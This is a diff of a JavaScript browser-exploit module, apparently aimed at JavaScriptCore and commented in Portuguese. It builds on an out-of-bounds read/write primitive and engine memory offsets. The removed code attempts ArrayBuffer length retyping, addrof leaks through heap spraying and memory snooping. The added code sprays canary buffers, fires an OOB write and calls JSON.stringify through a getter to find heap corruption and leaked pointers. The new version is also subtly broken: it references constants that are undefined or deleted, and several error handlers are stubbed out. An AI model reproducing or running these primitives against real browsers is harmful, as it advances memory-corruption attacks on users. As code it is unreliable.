@@ -11,285 +11,215 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForMassiveAttack";
+const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForCorruptedStringifier";
 let getter_called_flag = false;
-let current_test_results = { /* Será inicializado corretamente */ };
+let current_test_results = {
+    success: false,
+    message: "Teste não iniciado.",
+    error: null,
+    details: "",
+    leaked_canary_info: []
+};
 
 const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
 const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
 
-// Para Teste 1: Metadados sombra para tamanho gigante
-const FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE = 0x0; 
-const FAKE_AB_HUGE_SIZE = new AdvancedInt64(0x7FFFFFF0, 0x0); 
-const FAKE_AB_DATA_POINTER_FOR_RETYPE = new AdvancedInt64(0x0, 0x0);
-
-class CheckpointForMassiveAttack {
+class CheckpointForCorruptedStringifier {
     constructor(id) {
-        this.id_marker = `MassiveAttackCheckpoint-${id}`;
-        this.test_prop = "initial_checkpoint_prop_value";
+        this.id_marker = `CorruptedStringifierCheckpoint-${id}`;
     }
 
     get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
         getter_called_flag = true;
-        const FNAME_GETTER = "MassiveAttack_Getter";
-        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Iniciando bateria de testes...`, "vuln", FNAME_GETTER);
+        const FNAME_GETTER = "CorruptedStringifier_Getter";
+        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
         
-        // CORRIGIDO: Inicialização completa de current_test_results e suas sub-propriedades
         current_test_results = {
-            overall_success: false, message: "Getter chamado, testes em andamento.",
-            t1_retype_oob_ab: { success: false, details: "" },
-            t2_addrof_spray: { success: false, leaks: [], details: "" },
-            t3_snoop_oob_ab: { success: false, leaks: [], details: "" }, // Corrigido: Inicializado como objeto
-            t4_fresh_ab: { success: false, details: "" },             // Corrigido: Teste 4 também usa um sub-objeto
-            t5_this_integrity: { details: `this.id_marker: ${this.id_marker}, this.test_prop: ${this.test_prop || 'N/A'}` },
-            error_in_getter: null
+            success: false, message: "Getter chamado, testando Stringifier corrompido.",
+            error: null, details: "", leaked_canary_info: []
         };
-        let sub_test_success_flag = false; // Flag para rastrear se algum sub-teste individual teve sucesso
+        let details_log = [];
+        let anomalias_observadas = false;
 
         try {
-            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute || !JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer || !JSC_OFFSETS.JSCell) {
-                throw new Error("Dependências críticas (OOB R/W, oob_ab, Offsets) não disponíveis no getter.");
+            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
+                throw new Error("Dependências OOB R/W ou oob_ab não disponíveis no getter.");
             }
-            // const arrayBufferStructureID = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID; // Descomente se usar
 
-            // --- Teste 1: Re-Tipagem de Length do oob_array_buffer_real ---
-            logS3("DENTRO DO GETTER (Teste 1): Tentando Re-Tipagem de Length do oob_array_buffer_real...", "subtest", FNAME_GETTER);
-            let t1_temp_details = "";
-            try {
-                oob_write_absolute(FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, FAKE_AB_HUGE_SIZE, 8);
-                oob_write_absolute(FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, FAKE_AB_DATA_POINTER_FOR_RETYPE, 8);
-                t1_temp_details = `Metadados sombra (size=${FAKE_AB_HUGE_SIZE.toString(true)}) plantados em oob_data[${toHex(FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE)}]. `;
-                
-                const reader_t1 = new Uint32Array(oob_array_buffer_real);
-                t1_temp_details += `Uint32Array criado. Length reportado: ${reader_t1.length}. oob_ab.byteLength: ${oob_array_buffer_real.byteLength}.`;
-                
-                if (reader_t1.length * 4 === FAKE_AB_HUGE_SIZE.low() && FAKE_AB_HUGE_SIZE.low() > oob_array_buffer_real.byteLength) {
-                    current_test_results.t1_retype_oob_ab.success = true; sub_test_success_flag = true;
-                    t1_temp_details += " SUCESSO NA RE-TIPAGEM DE LENGTH!";
-                    logS3(t1_temp_details, "vuln", FNAME_GETTER); // Log com detalhes até o ponto de sucesso/falha
-                    // ... (lógica de leitura OOB se sucesso)
-                } else {
-                     t1_temp_details += ` Falha (Esperado ${FAKE_AB_HUGE_SIZE.low()/4}).`;
-                     logS3(t1_temp_details, "info", FNAME_GETTER);
-                }
-            } catch (e1) { 
-                t1_temp_details += ` Erro: ${e1.message}.`; 
-                logS3(`Erro no Teste 1 (Re-Tipagem Length): ${e1.message}`, "error", FNAME_GETTER);
+            // 1. Criar objeto complexo para desafiar o Stringifier (que pode estar corrompido)
+            let complex_object_to_stringify_internally = {
+                propA: "ValorStringLongo_ParaForcarAlocacao_ABCDEFGHIJKLMNOPQRSTUVWXYZ",
+                propB: 1234567890,
+                propC: true,
+                propD: { nested: "profundo", arr: [10,20,30,40,50] },
+                propE: null,
+                propF: [ {x:1,y:2}, {x:3,y:4} ]
+            };
+            // Adicionar referência circular para estressar o detector de ciclo do Stringifier
+            // @ts-ignore
+            complex_object_to_stringify_internally.propD.arr.push(complex_object_to_stringify_internally);
+            details_log.push("Objeto complexo para stringify interno criado.");
+
+            // 2. Pulverizar ArrayBuffers "Canário"
+            const canary_spray_count = 200;
+            const canary_ab_size = 16; // Pequeno para muitos
+            const canary_pattern_base = 0xCAFE0000;
+            let canary_abs = [];
+            logS3("DENTRO DO GETTER: Pulverizando ArrayBuffers canário...", "info", FNAME_GETTER);
+            for (let i = 0; i < canary_spray_count; i++) {
+                try {
+                    let ab = new ArrayBuffer(canary_ab_size);
+                    new DataView(ab).setUint32(0, canary_pattern_base + i, true); // Padrão único
+                    canary_abs.push(ab);
+                } catch (e_alloc) { details_log.push(`Erro ao alocar canário ${i}: ${e_alloc.message}`); }
             }
-            current_test_results.t1_retype_oob_ab.details = t1_temp_details;
+            details_log.push(`Spray de ${canary_abs.length} canários (ABs de ${canary_ab_size} bytes) concluído.`);
 
-            // --- Teste 2: AddrOf Especulativo com Spray ---
-            logS3("DENTRO DO GETTER (Teste 2): Tentando addrof especulativo com spray...", "subtest", FNAME_GETTER);
-            let t2_temp_leaks = [];
-            let t2_temp_details = "";
+            // 3. Forçar o Stringifier (potencialmente corrompido) a trabalhar
+            logS3("DENTRO DO GETTER: Chamando JSON.stringify INTERNO sobre objeto complexo...", "subtest", FNAME_GETTER);
+            let internal_stringify_result = "";
+            let internal_stringify_error = null;
             try {
-                // ... (lógica do Teste 2 como antes) ...
-                const target_obj_addrof_t2 = { "addrof_target": Date.now() };
-                const spray_count_t2 = 100; 
-                let float_readers_t2 = []; let obj_holders_t2 = [];
-                const pattern_t2 = Math.sqrt(2);
-
-                for(let i=0; i<spray_count_t2; i++) {
-                    let fa = new Float64Array(4); 
-                    for(let k=0; k<fa.length; k++) fa[k] = pattern_t2 + i;
-                    float_readers_t2.push(fa);
-                    obj_holders_t2.push( (i === Math.floor(spray_count_t2 / 2)) ? [target_obj_addrof_t2] : [{dummy_obj_t2:i}] );
+                internal_stringify_result = JSON.stringify(complex_object_to_stringify_internally);
+                logS3("DENTRO DO GETTER: JSON.stringify interno completado. Tamanho do resultado: " + internal_stringify_result.length, "info", FNAME_GETTER);
+            } catch (e_json_internal) {
+                internal_stringify_error = e_json_internal.message;
+                logS3(`DENTRO DO GETTER: Erro no JSON.stringify interno: ${e_json_internal.message}`, "error", FNAME_GETTER);
+                details_log.push(`Erro JSON.stringify interno: ${e_json_internal.message}`);
+                // Um erro aqui PODE ser interessante se for diferente do erro de ciclo normal
+                if (!String(e_json_internal.message).toLowerCase().includes("circular")) {
+                    anomalias_observadas = true;
                 }
-                t2_temp_details = `Spray de ${spray_count_t2} arrays concluído. `;
-                let leak_found_in_spray_t2 = false;
-                for(let i=0; i<float_readers_t2.length; i++) {
-                    for(let j=0; j<float_readers_t2[i].length; j++) {
-                        if (float_readers_t2[i][j] !== (pattern_t2 + i)) {
-                            const f_val_t2 = float_readers_t2[i][j];
-                            const dv_t2_leak = new DataView(new ArrayBuffer(8)); dv_t2_leak.setFloat64(0, f_val_t2, true);
-                            const p_adv64_t2 = new AdvancedInt64(dv_t2_leak.getUint32(0,true), dv_t2_leak.getUint32(4,true));
-                            t2_temp_leaks.push({source: `FloatArray[${i}][${j}]`, float_value: f_val_t2, hex_value: p_adv64_t2.toString(true)});
-                            leak_found_in_spray_t2 = true;
-                        }
+            }
+
+            // 4. Verificar os Canários por corrupção
+            logS3("DENTRO DO GETTER: Verificando ArrayBuffers canário por corrupção...", "info", FNAME_GETTER);
+            let corrupted_canaries_found = 0;
+            for (let i = 0; i < canary_abs.length; i++) {
+                const ab_check = canary_abs[i];
+                if (!ab_check || !(ab_check instanceof ArrayBuffer) || ab_check.byteLength !== canary_ab_size) {
+                    details_log.push(`Canário[${i}] corrompido (tipo/tamanho inválido)! Tipo: ${Object.prototype.toString.call(ab_check)}, Length: ${ab_check?.byteLength}`);
+                    corrupted_canaries_found++;
+                    anomalias_observadas = true;
+                    continue;
+                }
+                try {
+                    const dv_check = new DataView(ab_check);
+                    const val_check = dv_check.getUint32(0, true);
+                    if (val_check !== (canary_pattern_base + i)) {
+                        details_log.push(`Canário[${i}] CONTEÚDO CORROMPIDO! Esperado ${toHex(canary_pattern_base + i)}, Lido ${toHex(val_check)}`);
+                        current_test_results.leaked_canary_info.push(`Canary[${i}] data: ${toHex(val_check)} (expected ${toHex(canary_pattern_base + i)})`);
+                        corrupted_canaries_found++;
+                        anomalias_observadas = true;
                     }
+                } catch (e_canary_read) {
+                     details_log.push(`Erro ao ler canário[${i}]: ${e_canary_read.message}`);
+                     corrupted_canaries_found++;
+                     anomalias_observadas = true;
                 }
-                if (leak_found_in_spray_t2) {
-                    current_test_results.t2_addrof_spray.success = true; sub_test_success_flag = true;
-                    logS3(`POTENCIAIS LEAKS ADDR_OF NO SPRAY (T2): ${t2_temp_leaks.length} encontrados.`, "vuln", FNAME_GETTER);
-                }
-            } catch (e2) { t2_temp_details += `Erro: ${e2.message}.`; logS3(`Erro no Teste 2 (AddrOf Spray): ${e2.message}`, "error", FNAME_GETTER); }
-            current_test_results.t2_addrof_spray.details = t2_temp_details;
-            current_test_results.t2_addrof_spray.leaks = t2_temp_leaks;
-
-            // --- Teste 3: Sondagem Ampla do oob_array_buffer_real ---
-            logS3("DENTRO DO GETTER (Teste 3): Sondando oob_array_buffer_real (primeiros 512 bytes)...", "subtest", FNAME_GETTER);
-            let t3_temp_leaks = [];
-            let t3_temp_details = "";
-            try {
-                // ... (lógica do Teste 3 como antes) ...
-                const snoop_end_t3 = Math.min(0x200, oob_array_buffer_real.byteLength);
-                let ptr_found_in_snoop_t3 = false;
-                for (let offset = 0; offset < snoop_end_t3; offset += 8) {
-                    if (offset === CORRUPTION_OFFSET_TRIGGER && oob_array_buffer_real.byteLength > offset + 7) continue; 
-                    const val64_t3 = oob_read_absolute(offset, 8);
-                    if (!val64_t3.equals(AdvancedInt64.Zero) && !val64_t3.equals(CORRUPTION_VALUE_TRIGGER)) {
-                        const val_str_t3 = val64_t3.toString(true);
-                        t3_temp_leaks.push({offset: toHex(offset), value: val_str_t3});
-                        if (val64_t3.high() > 0x1000 && val64_t3.high() < 0x80000000 ) {
-                             logS3(`PONTEIRO SUSPEITO (T3) em oob_data[${toHex(offset)}] = ${val_str_t3}`, "leak", FNAME_GETTER);
-                             ptr_found_in_snoop_t3 = true;
-                        }
-                    } else if (offset === CORRUPTION_OFFSET_TRIGGER) {
-                        t3_temp_leaks.push({offset: toHex(offset), value: `${val64_t3.toString(true)} (CorruptionValueTrigger)`});
-                    }
-                }
-                t3_temp_details = `Sondagem de ${toHex(snoop_end_t3)} bytes concluída. `;
-                if (ptr_found_in_snoop_t3) {
-                    current_test_results.t3_snoop_oob_ab.success = true; sub_test_success_flag = true;
-                }
-            } catch (e3) { t3_temp_details += `Erro: ${e3.message}.`; logS3(`Erro no Teste 3 (Sondagem): ${e3.message}`, "error", FNAME_GETTER); }
-            current_test_results.t3_snoop_oob_ab.details = t3_temp_details;
-            current_test_results.t3_snoop_oob_ab.leaks = t3_temp_leaks;
-
-            // --- Teste 4: ArrayBuffer "Fresco" ---
-            logS3("DENTRO DO GETTER (Teste 4): Verificando ArrayBuffer 'fresco'...", "subtest", FNAME_GETTER);
-            let t4_temp_details = "";
-            try {
-                // ... (lógica do Teste 4 como antes) ...
-                let fresh_ab_t4 = new ArrayBuffer(128);
-                let dv_fresh_t4 = new DataView(fresh_ab_t4);
-                dv_fresh_t4.setUint32(0, 0x42424242, true);
-                if (fresh_ab_t4.byteLength === 128 && dv_fresh_t4.getUint32(0,true) === 0x42424242) {
-                    t4_temp_details = "AB fresco funciona normalmente.";
-                } else {
-                    t4_temp_details = `AB fresco ANÔMALO! Length: ${fresh_ab_t4.byteLength}, Conteúdo[0]: ${toHex(dv_fresh_t4.getUint32(0,true))}`;
-                    current_test_results.t4_fresh_ab.success = true; // Sucesso se for anômalo
-                    sub_test_success_flag = true; 
-                }
-                logS3(`(T4) ${t4_temp_details}`, current_test_results.t4_fresh_ab.success ? "vuln" : "info", FNAME_GETTER);
-            } catch (e4) { t4_temp_details = `Erro no Teste 4 (AB Fresco): ${e4.message}`; logS3(t4_temp_details, "error", FNAME_GETTER); }
-            current_test_results.t4_fresh_ab.details = t4_temp_details;
-            
-            // --- Teste 5: Integridade do 'this' (checkpoint_obj) ---
-            // Já está na inicialização de current_test_results, apenas logamos
-            logS3(`DENTRO DO GETTER (Teste 5): Verificando 'this'... ${current_test_results.t5_this_integrity.details}`, "subtest", FNAME_GETTER);
-
-
-            if (sub_test_success_flag) {
-                current_test_results.overall_success = true;
-                current_test_results.message = "Bateria de testes CONCLUÍDA COM POTENCIAL SUCESSO em um ou mais sub-testes!";
+            }
+            if (corrupted_canaries_found > 0) {
+                logS3(`DENTRO DO GETTER: ${corrupted_canaries_found} CANÁRIOS CORROMPIDOS ENCONTRADOS!`, "vuln", FNAME_GETTER);
             } else {
-                 current_test_results.message = "Bateria de testes no getter concluída, sem sucesso óbvio em re-tipagem ou vazamento.";
+                 logS3("DENTRO DO GETTER: Nenhum canário parece corrompido.", "good", FNAME_GETTER);
             }
+
+            // 5. Sondar o oob_array_buffer_real por dados inesperados
+            logS3("DENTRO DO GETTER: Sondando oob_array_buffer_real por escritas inesperadas...", "info", FNAME_GETTER);
+            const snoop_end_t5 = Math.min(0x400, oob_array_buffer_real.byteLength);
+            for (let offset = 0; offset < snoop_end_t5; offset += 8) {
+                if (offset === CORRUPTION_OFFSET_TRIGGER || (offset >= FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE && offset < FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE + 16)) continue; // Ignorar nossas escritas
+                const val64_t5 = oob_read_absolute(offset, 8);
+                if (!val64_t5.equals(AdvancedInt64.Zero)) {
+                    const val_str_t5 = val64_t5.toString(true);
+                    details_log.push(`Snoop oob_data[${toHex(offset)}] = ${val_str_t5}`);
+                    logS3(`SNOOP oob_data[${toHex(offset)}] = ${val_str_t5}`, "leak", FNAME_GETTER);
+                    anomalias_observadas = true;
+                }
+            }
+
+            if (anomalias_observadas) {
+                current_test_results.success = true;
+                current_test_results.message = "Anomalias (canários corrompidos ou escritas inesperadas em oob_ab) detectadas após stringify interno!";
+            } else {
+                current_test_results.message = "Nenhuma anomalia óbvia detectada após stringify interno.";
+            }
+            current_test_results.details = details_log.join('; ');
 
         } catch (e_getter_main) {
             logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
-            current_test_results.error_in_getter = String(e_getter_main);
+            current_test_results.error = String(e_getter_main);
             current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
         }
         return 0xBADF00D;
     }
 
     toJSON() {
-        const FNAME_toJSON = "CheckpointForMassiveAttack.toJSON";
+        const FNAME_toJSON = "CheckpointForCorruptedStringifier.toJSON";
         logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
         // eslint-disable-next-line no-unused-vars
         const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
-        return { id: this.id_marker, processed_by_massive_attack_test: true };
+        return { id: this.id_marker, processed_by_corrupted_stringifier_test: true };
     }
 }
 
-export async function executeRetypeOOB_AB_Test() {
-    const FNAME_TEST_RUNNER = "executeMassiveAttackInGetterRunner";
-    logS3(`--- Iniciando Bateria de Testes Agressivos no Getter ---`, "test", FNAME_TEST_RUNNER);
+export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
+    const FNAME_TEST_RUNNER = "executeCorruptedStringifierTestRunner";
+    logS3(`--- Iniciando Teste de Stringifier Corrompido ---`, "test", FNAME_TEST_RUNNER);
 
     getter_called_flag = false;
-    current_test_results = { // Reset inicial completo
-        overall_success: false, message: "Teste não executado.",
-        t1_retype_oob_ab: { success: false, details: "" },
-        t2_addrof_spray: { success: false, leaks: [], details: "" },
-        t3_snoop_oob_ab: { success: false, leaks: [], details: "" },
-        t4_fresh_ab: { success: false, details: "" },
-        t5_this_integrity: { details: "" }, // Será preenchido no getter
-        api_interaction_errors: [], error: null, error_in_getter: null
-    };
+    current_test_results = { /* ... reset ... */}; // Reset no início
 
-    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID || !JSC_OFFSETS.JSCell) {
-        logS3("Offsets JSC críticos ausentes.", "critical", FNAME_TEST_RUNNER);
-        current_test_results.message = "Offsets JSC críticos ausentes.";
-        return;
-    }
+    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { return; }
 
     try {
         await triggerOOB_primitive();
-        if (!oob_array_buffer_real || !oob_dataview_real) {
-            logS3("OOB Init falhou.", "critical", FNAME_TEST_RUNNER);
-            current_test_results.message = "OOB Init falhou.";
-            return;
-        }
+        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
         logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
         
-        logS3(`Plantando metadados sombra para Teste 1 (size=${FAKE_AB_HUGE_SIZE.toString(true)}) em oob_data[${toHex(FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE)}]...`, "info", FNAME_TEST_RUNNER);
-        oob_write_absolute(FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, FAKE_AB_HUGE_SIZE, 8);
-        oob_write_absolute(FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, FAKE_AB_DATA_POINTER_FOR_RETYPE, 8);
+        // Plantar metadados sombra (pode não ser usado, mas mantém consistência com alguns testes anteriores)
+        // Estes NÃO são os que esperamos que o oob_array_buffer_real use para re-tipagem.
+        oob_write_absolute(0x0 + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, SHADOW_SIZE_LARGE, 8);
+        oob_write_absolute(0x0 + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, SHADOW_DATA_POINTER_CRASH, 8);
         
+        // Escrita OOB Gatilho
         oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
         logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);
 
-        const checkpoint_obj = new CheckpointForMassiveAttack(1);
-        logS3(`CheckpointForMassiveAttack objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
+        const checkpoint_obj = new CheckpointForCorruptedStringifier(1);
+        logS3(`CheckpointForCorruptedStringifier objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
         
         logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
         try {
             JSON.stringify(checkpoint_obj);
-        } catch (e) { 
-            logS3(`Erro em JSON.stringify: ${e.message}`, "error", FNAME_TEST_RUNNER);
-            if(!getter_called_flag) {
-                current_test_results.error = String(e);
-                current_test_results.message = `Erro em JSON.stringify (antes do getter): ${e.message}`;
-            }
-        }
+        } catch (e) { /* ... */ }
 
-    } catch (mainError) {
-        logS3(`Erro principal no runner: ${mainError.message}`, "critical", FNAME_TEST_RUNNER);
-        console.error(mainError); // Logar o erro completo no console do navegador
-        current_test_results.message = `Erro crítico no runner: ${mainError.message}`;
-        current_test_results.error = String(mainError);
-    } finally {
-        logS3("Limpeza finalizada.", "info", "CleanupRunner");
-    }
+    } catch (mainError) { /* ... */ }
+    finally { /* ... */ }
 
-    // Log dos resultados consolidados
+    // Log dos resultados
     if (getter_called_flag) {
-        logS3(`RESULTADO GERAL DA BATERIA DE TESTES: Success = ${current_test_results.overall_success}, Msg = ${current_test_results.message}`, current_test_results.overall_success ? "vuln" : "warn", FNAME_TEST_RUNNER);
-        logS3(`  T1 (ReType OOB_AB): Success=${current_test_results.t1_retype_oob_ab.success}. ${current_test_results.t1_retype_oob_ab.details}`, "info", FNAME_TEST_RUNNER);
-        
-        logS3(`  T2 (AddrOf Spray): Success=${current_test_results.t2_addrof_spray.success}. Leaks: ${current_test_results.t2_addrof_spray.leaks.filter(l => typeof l === 'object').length}`, "info", FNAME_TEST_RUNNER);
-        current_test_results.t2_addrof_spray.leaks.forEach(l => {
-            if (typeof l === 'object' && l.hex_value) { // Verifica se é o objeto de leak esperado
-                logS3(`    Leak: ${l.hex_value} (float: ${l.float_value})`, "leak", FNAME_TEST_RUNNER);
-            } else { 
-                logS3(`    ${l}`, "info", FNAME_TEST_RUNNER); // Loga strings como "Spray concluído"
-            }
-        });
-
-        logS3(`  T3 (Snoop OOB_AB): Success=${current_test_results.t3_snoop_oob_ab.success}. Leaks: ${current_test_results.t3_snoop_oob_ab.leaks.filter(l => typeof l === 'object').length}`, "info", FNAME_TEST_RUNNER);
-        current_test_results.t3_snoop_oob_ab.leaks.forEach(l => {
-             if (typeof l === 'object' && l.value) { // Verifica se é o objeto de leak esperado
-                logS3(`    Offset ${l.offset}: ${l.value}`, "leak", FNAME_TEST_RUNNER);
-            } else {
-                logS3(`    ${l}`, "info", FNAME_TEST_RUNNER);
-            }
-        });
-        logS3(`  T4 (AB Fresco): Success=${current_test_results.t4_fresh_ab.success}. ${current_test_results.t4_fresh_ab.details}`, "info", FNAME_TEST_RUNNER);
-        logS3(`  T5 (This Integrity): ${current_test_results.t5_this_integrity.details}`, "info", FNAME_TEST_RUNNER);
-        
-        if (current_test_results.error_in_getter) {
-            logS3(`  Erro no Getter: ${current_test_results.error_in_getter}`, "error", FNAME_TEST_RUNNER);
+        if (current_test_results.success) {
+            logS3(`RESULTADO TESTE STRINGIFIER CORROMPIDO: SUCESSO ESPECULATIVO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
+        } else {
+            logS3(`RESULTADO TESTE STRINGIFIER CORROMPIDO: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
         }
-
+        if (current_test_results.details) {
+             logS3(`  Detalhes da tentativa: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
+        }
+        if (current_test_results.leaked_canary_info && current_test_results.leaked_canary_info.length > 0) {
+            logS3("Informações dos Canários Corrompidos:", "leak", FNAME_TEST_RUNNER);
+            current_test_results.leaked_canary_info.forEach(info => {
+                logS3(`  ${info}`, "leak", FNAME_TEST_RUNNER);
+            });
+        }
+         if (current_test_results.error || current_test_results.error_in_getter) {
+            logS3(`  Erro reportado: ${current_test_results.error || current_test_results.error_in_getter}`, "error", FNAME_TEST_RUNNER);
+        }
     } else {
-        logS3("RESULTADO BATERIA DE TESTES: Getter NÃO foi chamado.", "error", FNAME_TEST_RUNNER);
-        if (current_test_results.error) { // Se houve erro no runner antes do getter
-            logS3(`  Erro (no runner): ${current_test_results.error} | Mensagem: ${current_test_results.message}`, "error", FNAME_TEST_RUNNER);
-        }
+        logS3("RESULTADO TESTE STRINGIFIER CORROMPIDO: Getter NÃO foi chamado.", "error", FNAME_TEST_RUNNER);
     }
 
     clearOOBEnvironment();
-    logS3(`--- Bateria de Testes Agressivos no Getter Concluída ---`, "test", FNAME_TEST_RUNNER);
+    logS3(`--- Teste de Stringifier Corrompido Concluído ---`, "test", FNAME_TEST_RUNNER);
 }
